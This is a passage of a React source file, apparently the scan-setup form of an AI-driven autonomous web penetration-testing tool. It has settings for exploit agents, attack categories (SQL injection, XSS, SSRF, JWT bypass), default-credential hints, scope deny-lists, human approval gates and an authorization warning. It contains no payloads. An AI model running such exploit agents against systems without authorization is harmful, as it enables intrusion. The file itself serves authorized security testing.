                <p className="text-xs text-teal-700 dark:text-teal-300 mt-1.5">{ollamaModels.length} model(s) detected</p>
              )}
            </Field>
          ) : (
            <Field
              label="Model"
              hint="Pre-filled from Settings. You can override for this scan only."
            >
              <input
                type="text"
                value={form.llm_model || ""}
                onChange={(e) => set("llm_model", e.target.value)}
                placeholder={providerList.find(p => p.key === form.llm_provider)?.model || ""}
                className="input"
              />
            </Field>
          )
        )}

        {/* ── Custom Prompt ───────────────────────────────────────────────── */}
        <div className="border border-border rounded-lg overflow-hidden">
          <button
            type="button"
            onClick={() => set("custom_prompt", form.custom_prompt === undefined ? "" : undefined)}
            className="w-full flex items-center gap-2 px-4 py-3 text-sm font-medium bg-slate-100 dark:bg-zinc-800/40 hover:bg-slate-100 dark:hover:bg-zinc-800 transition-colors text-left"
          >
            <MessageSquarePlus className="h-4 w-4 text-teal-500 shrink-0" />
            <span>Custom Prompt</span>
            <span className="ml-auto text-xs text-muted-foreground font-normal">
              {form.custom_prompt !== undefined ? "Active" : "Optional - add context to guide the LLM"}
            </span>
          </button>
          {form.custom_prompt !== undefined && (
            <div className="px-4 py-3 space-y-2 border-t border-border bg-white dark:bg-zinc-900">
              <div className="flex items-center justify-between">
                <p className="text-xs text-muted-foreground">
                  This prompt is prepended to every agent's system prompt. Use it to provide target context,
                  known credentials, technology stack, or specific testing focus areas.
                </p>
                <button
                  type="button"
                  onClick={() => setShowTemplatePicker(true)}
                  className="shrink-0 ml-3 flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border border-teal-300 dark:border-teal-800/45 text-teal-700 dark:text-teal-400 hover:bg-teal-50 dark:hover:bg-teal-950/40 transition-colors"
                >
                  <LayoutTemplate className="h-3.5 w-3.5" />
                  Templates
                </button>
              </div>
              <textarea
                value={form.custom_prompt}
                onChange={(e) => set("custom_prompt", e.target.value)}
                rows={5}
                placeholder={`Examples:\n- Target is a Laravel 10 app with MySQL. Admin panel at /admin.\n- Known credentials: admin / admin123 (test default creds first)\n- Focus on authenticated endpoints. Auth cookie: session=...\n- App uses JWT. Test for alg:none and weak secrets.`}
                className="input w-full resize-y text-xs font-mono leading-relaxed"
              />
            </div>
          )}
        </div>

        {/* ── Advanced toggle ─────────────────────────────────────────────── */}
        <button
          type="button"
          onClick={() => setShowAdvanced(!showAdvanced)}
          className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground"
        >
          {showAdvanced ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
          Advanced options
        </button>

        {showAdvanced && (
          <div className="space-y-3.5 border-t border-border pt-4">

            <div className="grid grid-cols-3 gap-4">
              <Field
                label="Max Hypotheses"
                hint="Max attack hypotheses the LLM generates (header/info findings are auto-confirmed separately). Higher = more thorough. (4-50)"
                tooltip={"Controls how many active attack hypotheses the AI generates per scan.\n\nNOTE: Security header/misconfiguration findings are auto-confirmed separately and do NOT count toward this limit.\n\nGuideline:\n• 10-15 - Quick scan, covers main attack classes\n• 20 (default) - Balanced, covers OWASP Top 10\n• 30-40 - Thorough, includes chained attacks and edge cases\n• 50 - Maximum coverage, slower scan\n\nThe AI prioritizes by severity - Critical/High hypotheses are always generated first.\n\nEach hypothesis goes through: Generation → Exploit attempt → Confirmation → Finding report."}
              >
                <input type="number" value={form.max_hypotheses} min={4} max={50}
                  onChange={(e) => set("max_hypotheses", +e.target.value)} className="input" />
              </Field>
              {scanType === "web" && (<>
              <Field
                label="Parallel Workers"
                hint="Number of exploit agents running concurrently. Higher = faster but heavier on API quota. (1-5)"
                tooltip={"Number of exploit agents running simultaneously - each handles a different attack category.\n\nAttack categories dispatched in parallel:\n• injection - SQLi, Command Injection, XXE, SSTI\n• xss - Reflected, Stored, DOM XSS\n• traversal - Path Traversal, LFI\n• auth - Auth Bypass, JWT, Brute Force\n• access_control - IDOR, Privilege Escalation\n• ssrf_upload - SSRF, File Upload\n• info - Headers, Disclosures (fast)\n\nGuideline:\n• 1 - Minimal API usage, sequential\n• 3 (default) - Balanced speed/cost\n• 5 - Fastest, uses more API tokens simultaneously\n\nWith cloud providers, higher workers = more API calls per minute. Check your rate limits."}
              >
                <input type="number" value={form.max_parallel} min={1} max={5}
                  onChange={(e) => set("max_parallel", +e.target.value)} className="input" />
              </Field>
              <Field
                label="Feedback Iterations"
                hint="How many times the agent refines its exploit attempt based on response feedback. (0-3)"
                tooltip={"After the initial exploit pass, the agent reviews unconfirmed hypotheses and retries with adapted payloads based on what the server responded.\n\nHow it works:\n1. First pass - standard payload list per vuln type\n2. Iteration 1 - analyzes response clues (error messages, timing, redirects) and adapts payloads\n3. Iteration 2+ - further refinement based on new evidence\n\nGuideline:\n• 0 - Single pass only, fastest\n• 1 - One retry pass, catches WAF-protected endpoints\n• 2 (default) - Good balance of thoroughness vs speed\n• 3 - Maximum persistence, best for well-hardened targets\n\nEach iteration adds ~20-40% to scan duration."}
              >
                <input type="number" value={form.feedback_iter} min={0} max={3}
                  onChange={(e) => set("feedback_iter", +e.target.value)} className="input" />
              </Field>
              </>)}
            </div>

            {/* ── Exploit Tuning (web scans only : a source review sends no payloads) ── */}
            {scanType === "web" && (
            <div className="pt-1">
              <p className="text-xs font-semibold text-slate-500 dark:text-zinc-400 uppercase tracking-wide mb-3">Exploit Tuning</p>
              <div className="grid grid-cols-3 gap-4">
                <Field
                  label="Hypothesis Timeout (s)"
                  hint="Max seconds per hypothesis before it's skipped. (60-600)"
                  tooltip={"Hard wall-clock limit for each individual exploit hypothesis.\n\nIf the agent exceeds this time on a single hypothesis (e.g. waiting on a slow endpoint, deeply nested tool calls), it is automatically marked as timed-out and the scan continues with the next hypothesis.\n\nGuideline:\n• 120s - Fast scan, skip slow endpoints\n• 240s (default) - Balanced; most exploits succeed within 4 minutes\n• 360-480s - Thorough; allows slow SQL time-based blind injection\n• 600s - Maximum patience; for very slow targets\n\nLower this if your scans are hanging on a single hypothesis too long."}
                >
                  <input type="number" value={form.exploit_hypo_timeout} min={60} max={600}
                    onChange={(e) => set("exploit_hypo_timeout", +e.target.value)} className="input" />
                </Field>
                <Field
                  label="Max Turns / Hypothesis"
                  hint="Max LLM back-and-forth turns per hypothesis. Higher = more persistence. (4-20)"
                  tooltip={"Maximum number of LLM ↔ tool exchange turns the agent is allowed per hypothesis.\n\nEach turn: the LLM proposes a tool call (navigate, click, inject payload), executes it, observes the result, then decides the next step.\n\nGuideline:\n• 4-6 - Quick; works for straightforward injections\n• 8 (default) - Standard; enough for most cloud providers\n• 10 - Ollama default; local models need more turns\n• 12-15 - Deep persistence; for chained multi-step exploits\n• 20 - Maximum; use only if scan quality matters more than speed\n\nMore turns = slower per hypothesis, but higher confirmation rate on complex vulns."}
                >
                  <input type="number" value={form.exploit_max_turns} min={4} max={20}
                    onChange={(e) => set("exploit_max_turns", +e.target.value)} className="input" />
                </Field>
                <Field
                  label="Hypothesis Cap"
                  hint="Max total hypotheses attempted across the full scan. (5-100)"
                  tooltip={"Absolute ceiling on how many hypotheses the exploit engine will attempt, regardless of how many were generated.\n\nWhy this matters:\nIf the vuln analyzer generates 40+ hypotheses (complex app), this cap prevents the scan from running for hours. The engine prioritizes Critical → High → Medium hypotheses before hitting the cap.\n\nGuideline:\n• 15 - Quick scan for time-limited engagements\n• 25 (default) - Balanced; covers OWASP Top 10 well\n• 40-50 - Thorough; for large apps with many endpoints\n• 100 - Exhaustive; use for comprehensive audits\n\nNote: Security header/info findings are NOT counted toward this cap - they are auto-confirmed."}
                >
                  <input type="number" value={form.exploit_hypo_cap} min={5} max={100}
                    onChange={(e) => set("exploit_hypo_cap", +e.target.value)} className="input" />
                </Field>
              </div>
            </div>
            )}

            <div className="pt-1">
              <p className="text-xs font-semibold text-slate-500 dark:text-zinc-400 uppercase tracking-wide mb-3">Autonomy brakes</p>
              <div className="grid grid-cols-3 gap-4">
                <Field
                  label="Token budget"
                  hint="Soft spend ceiling for this engagement (prompt + completion tokens)."
                  tooltip={"Stops runaway LLM spend. When usage approaches this ceiling the engagement wraps up.\n\nGuideline:\n• 50k - short recon / cheap local models\n• 200k (default) - typical full web engagement\n• 500k+ - deep multi-agent runs"}
                >
                  <input type="number" value={form.token_budget ?? 200000} min={1000} step={1000}
                    onChange={(e) => set("token_budget", +e.target.value)} className="input" />
                </Field>
                <Field
                  label="Turn budget"
                  hint="Max agent turns across the engagement before wrap-up."
                  tooltip={"Hard brake on autonomy depth - independent of per-hypothesis turn limits.\n\nGuideline:\n• 40 - constrained\n• 80 (default) - balanced\n• 150 - long-haul"}
                >
                  <input type="number" value={form.turn_budget ?? 80} min={1} max={500}
                    onChange={(e) => set("turn_budget", +e.target.value)} className="input" />
                </Field>
                <Field
                  label="HITL intercepts"
                  hint="Pause risky actions for analyst approve/deny."
                  tooltip={"When enabled, destructive or high-risk tool calls land in Approvals until an analyst decides."}
                >
                  <label className="flex items-center gap-2 h-10 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={form.hitl_required !== false}
                      onChange={(e) => set("hitl_required", e.target.checked)}
                      className="h-4 w-4 rounded accent-teal-600"
                    />
                    <span className="text-sm text-slate-700 dark:text-zinc-300">Require approvals</span>
                  </label>
                </Field>
              </div>
              <Field
                label="Scope deny (hard)"
                hint="Paths/hosts the agent must never touch (one per line)."
                tooltip={"Hard deny-list enforced separately from soft scope exclude - used as an autonomy brake for out-of-bounds actions."}
              >
                <textarea
                  className="input h-16 resize-none text-xs font-mono"
                  placeholder={".*logout.*\n.*payment.*\nadmin.internal"}
                  value={(form.scope_deny || []).join("\n")}
                  onChange={(e) => set("scope_deny", e.target.value.split("\n").filter(Boolean))}
                />
              </Field>
            </div>

            {scanType === "web" && (<>
            <Field
              label="Scope Include"
              hint="Regex patterns (one per line) that endpoint URLs must match to be tested. Leave empty to include all endpoints."
              tooltip={"Whitelist filter - only endpoints matching at least one of these regex patterns will be tested.\n\nLeave empty to test all discovered endpoints.\n\nExamples:\n• .*api/.* - only test API endpoints\n• .*admin.* - only test admin area\n• .*login|.*register - only test auth endpoints\n• .*\\.php$ - only PHP pages\n\nSyntax: one regex pattern per line. Uses Python re syntax.\nPatterns are case-insensitive.\n\nUse case: Large applications where you only have permission to test specific sections."}
            >
              <textarea
                className="input h-20 resize-none text-xs font-mono"
                placeholder={".*login.*\n.*api/.*\n.*admin.*"}
                value={(form.scope_include || []).join("\n")}
                onChange={(e) => set("scope_include", e.target.value.split("\n").filter(Boolean))}
              />
            </Field>

            <Field
              label="Scope Exclude"
              hint="Regex patterns (one per line) that will skip matching endpoints. Useful to avoid logout, static assets, or out-of-scope paths."
              tooltip={"Blacklist filter - endpoints matching any of these patterns will be skipped entirely.\n\nCommon patterns to exclude:\n• .*logout.* - prevent accidental logout during scan\n• .*\\.css$|.*\\.js$|.*\\.png$ - skip static assets\n• .*delete.* - avoid destructive endpoints\n• .*payment.* - skip payment processing if out of scope\n• .*unsubscribe.* - avoid email unsubscribe links\n\nSyntax: one regex pattern per line. Case-insensitive.\n\nNote: If an endpoint matches BOTH include and exclude patterns, exclude takes priority."}
            >
              <textarea
                className="input h-20 resize-none text-xs font-mono"
                placeholder={".*logout.*\n.*\\.css$\n.*\\.js$"}
                value={(form.scope_exclude || []).join("\n")}
                onChange={(e) => set("scope_exclude", e.target.value.split("\n").filter(Boolean))}
              />
            </Field>
            </>)}

          </div>
        )}

        {/* ── Error ──────────────────────────────────────────────────────── */}
        {mutation.isError && (
          <div className="bg-red-50 dark:bg-red-950/40 border border-red-200 dark:border-red-800/50 text-red-800 dark:text-red-300 text-sm rounded-lg px-3 py-2">
            {(mutation.error as any)?.response?.data?.detail || "Failed to start scan"}
          </div>
        )}

        {/* ── Authorization warning ───────────────────────────────────────── */}
        <div className="bg-amber-50 dark:bg-amber-950/40 border border-amber-200 dark:border-amber-800/50 rounded-lg p-4 flex gap-3">
          <ShieldAlert className="h-5 w-5 text-amber-700 dark:text-amber-400 shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-semibold text-amber-900 dark:text-amber-200">Authorization Required</p>
            <p className="text-xs text-amber-800 dark:text-amber-300 mt-0.5 leading-relaxed">
              Scanning a target without explicit permission is illegal and unethical. Only proceed if you
              own the target, have written authorization from the owner, or are operating within an
              approved bug bounty or penetration testing engagement scope.
            </p>
            <label className="flex items-center gap-2 mt-3 cursor-pointer select-none">
              <input
                type="checkbox"
                checked={authorized}
                onChange={(e) => setAuthorized(e.target.checked)}
                className="h-4 w-4 rounded border-amber-300 accent-amber-600"
              />
              <span className="text-xs font-medium text-amber-800">
                I confirm I have explicit authorization to scan this target
              </span>
            </label>
          </div>
        </div>

        {/* ── Actions ────────────────────────────────────────────────────── */}
        <div className="flex gap-3 pt-2">
          <button
            type="button"
            onClick={() => navigate("/scans")}
            className="px-4 py-2 text-sm border border-border rounded-lg hover:bg-accent"
          >
            Cancel
          </button>
          <button
            type="button"
            disabled={!canSubmit}
            title={!providerReady ? "Select a provider that has credentials configured" : (validationError ?? undefined)}
            onClick={submit}
            className="flex-1 flex items-center justify-center gap-2 bg-teal-600 hover:bg-teal-700 dark:hover:bg-teal-500
                       disabled:opacity-60 text-white text-sm font-medium px-4 py-2 rounded-lg"
          >
            {mutation.isPending && <Loader2 className="h-4 w-4 animate-spin" />}
            Start Scan
          </button>
        </div>
      </div>
    </div>
  );
}
